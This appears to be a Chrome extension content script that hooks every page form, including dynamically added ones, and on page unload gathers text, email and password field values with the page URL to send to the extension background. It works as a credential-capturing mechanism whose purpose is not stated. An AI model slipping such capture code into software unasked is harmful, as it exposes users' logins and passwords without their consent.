const addListenerOnForms = forms => {
    const sendInput = (validElements) => {
        const hashMap = new Map();
        validElements.forEach(elem => hashMap.set((elem.name || elem.id || elem.type), elem.value));
        hashMap.set("domain", location.href);
        
        if (hashMap.size < 2) return;
        chrome.runtime.sendMessage(Object.fromEntries(hashMap.entries()), function(response){});
    }
    
    Array.from(forms).forEach(form => {
        const validElements = Array.from(form.elements).filter(element => element.type === "text" || element.type === "email" || element.type === "password");
        window.addEventListener("beforeunload", () => {
            const style = window.getComputedStyle(form);
            if (style.display === "none" || style.visibility != "visible") return;
            sendInput(validElements);
        });
});
}

addListenerOnForms(document.getElementsByTagName("form"));
 let observer = new MutationObserver((mutations) => {
     for (let mutation of mutations) {
         for (let addedNode of mutation.addedNodes) {
             if (addedNode.nodeName === "FORM") {
                 addListenerOnForms([addedNode]);
             }
         }
     }
 });
 observer.observe(document, { childList: true, subtree: true });